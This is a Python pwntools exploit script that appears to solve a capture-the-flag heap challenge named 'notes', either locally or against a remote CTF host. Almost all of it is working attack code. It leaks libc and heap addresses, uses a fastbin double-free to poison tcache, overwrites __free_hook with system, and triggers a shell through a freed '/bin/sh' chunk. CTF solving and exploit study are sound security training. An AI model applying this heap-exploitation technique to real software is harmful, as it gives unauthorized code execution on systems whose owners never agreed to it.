#!/usr/bin/env python3

from pwn import *

the_binary = "./notes"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.31.so", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("notes.nc.jctf.pro", 5001)
elif args.STRACE:
    io = process(["strace", "-o", "trace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        continue
    """)

def send_int(i, prompt=b": "):
    io.sendafter(prompt, str(i).encode() + b"\x00")

def menu(choice):
    send_int(choice, prompt=b"> ")

def add_note(data, sz=None):
    if sz is None:
        sz = len(data)
    assert sz <= 0x100

    menu(1)
    send_int(sz)
    io.sendafter(b"content: ", data)

def free_note(idx):
    menu(2)
    send_int(idx)

def view_note(idx, is_ptr=True):
    menu(3)
    send_int(idx)

    raw_data = io.recvuntil(b"\n1.", drop=True)
    if is_ptr:
        return u64(raw_data.ljust(8, b"\x00"))
    else:
        return raw_data

# Number of notes we'll allocate; sending -1 gives us unlimited allocations.
send_int(-1)

# Fill 0x20-sized tcache list.
for i in range(7):
    add_note(str(i).encode()*0x18)
# Fill 0x110-sized tcache list.
for i in range(7):
    add_note(bytes([i])*0x10, sz=0x100)

# Fastbin chunks we will use below in a double-free scenario.
add_note(b"A"*0x18)
add_note(b"B"*0x18)

# The a chunk will end up in the smallbin (since it's tcache list is
# full and it's not a fastbin size). Once freed down below, we'll use
# it to give us our libc leak.
add_note(b"a"*0x10, sz=0x100)
add_note(b"b"*0x10, sz=0x100)

# Fill 0x20-sized tcache list, so future allocations end up
# in the fastbin.
for i in reversed(range(7)):
    free_note(i)
    free_note(i+7)
free_note(16)

libc_leak = view_note(16)
libc.address = libc_leak - 0x1ecbe0
log.info("Libc leak: %#x" % libc_leak)
log.info("Libc base: %#x" % libc.address)

heap_leak = view_note(0)
heap_base = heap_leak - 0x2c0
log.info("Heap leak: %#x" % heap_leak)
log.info("Heap base: %#x" % heap_base)

# Double-free of fastbin chunks.
free_note(14)
free_note(15)
free_note(14)

# Empty the 0x20-sized tcache list so we can allocate out of the fastbin.
for i in range(7):
    add_note(str(i).encode()*0x18)

# Allocate the double-freed chunk and overwrite its fd pointer. Before this
# point, the corrupted chunk has already been promoted to the tcache, so we
# are overwriting the tcache fd pointer.
add_note(p64(libc.sym.__free_hook), sz=0x18)

# Allocate until we get a chunk over __free_hook, and overwrite it.
add_note(b"/bin/sh\x00", sz=0x18)
add_note(b"zzzz", sz=0x18)
add_note(p64(libc.sym.system), sz=0x18)

free_note(26)

io.interactive()
